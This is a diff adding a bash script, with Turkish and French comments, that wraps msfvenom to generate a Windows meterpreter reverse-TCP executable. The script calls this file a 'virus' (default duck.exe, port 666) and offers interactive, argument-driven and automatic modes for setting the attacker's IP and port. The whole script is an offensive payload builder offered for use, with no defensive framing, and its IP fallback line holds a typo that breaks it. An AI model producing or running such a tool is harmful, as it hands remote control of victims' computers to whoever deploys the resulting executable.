@@ -1,0 +1,149 @@
+#!/bin/bash
+
+# *Bismillah*
+
+#######################
+#a script by lazy-pwny#
+#######################
+
+#easy windows pwner tool (v i², i € C)
+
+#bash(baş) script sevenler derneği tarafından hazırlanmıştır.
+#lisansa gerek gormedim ama soran olursa GNU 3
+
+#sadelik iyidir guzel olursa devami da gelir.
+
+#renkler.
+kirmizi="\e[91m"
+yesil="\e[92m"
+mavi="\e[34m"
+turuncu="\e[93m"
+tp="\e[0m"
+
+#degiskenler.
+tire="➖️➖️➖️➖️➖️➖️➖️➖️➖️➖️➖️➖️➖️➖️➖️➖️➖️➖️➖️➖️"
+
+lhost=$(ip route | awk 'NR==2{print $9}')
+
+if [[ $lhost = "" ]] ; then
+lhosy=$(ip route | awk 'NR==1{print $9}')
+fi
+
+lpt="666"
+vn="duck" # bittiğinde (duck.exe) olacak ;)
+
+echo -e "your local IP: ${turuncu}${lhost}${tp}"
+echo $tire
+
+#¿Help?
+
+if [[ $1 = "" ]] ; then
+	echo -e "${yesil}./lazyScript7.bash ${mavi}i:$tp (Easy, interface mode.)$tp"
+	echo -e "${yesil}./lazyScript7.bash ${turuncu}<LHOST> <LPORT> <VIRUSNAME>:$tp (Very Easy, basic mode.'if you don't know just give <d>')$tp"
+	echo -e "${yesil}./lazyScript7.bash ${mavi}a:$tp (Ultra Very Easy, Automatic mode.)$tp"
+	exit
+	echo $tire
+fi
+
+#Interfacely.
+
+if [[ $1 = i ]] ; then
+	echo -e "${mavi}interface mode${tp}(if you are not think about question just press enter):"
+	echo $tire
+	read -p "what is your local IP? Default: '${lhost}': " lip
+	echo $tire
+	read -p "you want to which port? Default: '${lpt}':" lport
+	echo $tire
+	read -p "you want to give which name on this virus? Default: '${vn}':" virusname
+	echo "$tire"
+
+if [[ $lip = *.*.*.* ]] ; then
+	lhost=$lip
+fi
+
+if [[ $lport = "" ]] ; then
+		lpt=$lpt
+	else
+		lpt=$lport
+fi
+
+if [[ $virusname = "" ]] ; then
+		vn=$vn
+	else
+		vn=$virusname
+fi
+
+fi
+
+#Automaticly.
+
+if [[ $1 = a ]] ; then
+	echo "Your Virus Creating Automaticly.."
+echo ""
+
+fi
+
+#Manualy.
+
+if [[ $1 = *.*.*.* ]] ; then
+	if [[ $2 = d ]] ; then	
+		if [[ $3 = d ]] ; then
+			vn=$vn
+		else
+			vn=$3
+		fi
+		lpt=$lpt	
+	else
+			if [[ $3 = d ]] ; then
+				vn=$vn
+			else
+				vn=$3
+			fi
+		lpt=$2		
+	fi
+lhost=$1
+elif [[ $1 = d ]] ; then
+	if [[ $2 = d ]] ; then
+		if [[ $3 = d ]] ; then
+			vn=$vn
+		else
+			vn=$3
+		fi
+		lpt=$lpt
+	else
+			if [[ $3 = d ]] ; then
+				vn=$vn
+			else
+				vn=$3
+			fi
+
+		lpt=$2		
+	fi
+lhost=$lhost
+fi
+
+#resultat.
+
+echo "information: lhost='$lhost', lport='$lpt', virusname='$PWD/$vn.exe'"
+
+echo $tire
+
+x1="0"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lpt -f exe -o $vn.exe && x1="1" # ici on utulise monsieur venom
+
+if [[ $x1 = 1 ]] ; then
+	echo -e "${yesil}Your Virus has been created successfully. [✔️ ]$tp"
+	
+	echo $tire
+	echo "Don't Forget Them Because You Will Use That Numbers:"
+	echo ""
+	echo -e "${kirmizi}Local Host (IP)$tp:${turuncu}${lhost}$tp"
+	echo -e "${kirmizi}Local Port (Port Number)$tp:${turuncu}${lpt}$tp"
+
+	echo $tire
+
+	exit 0 
+else
+	echo -e "${kirmizi}Your Virus can not be creating here. [✖️ ]$tp"	
+	exit 1
+fi
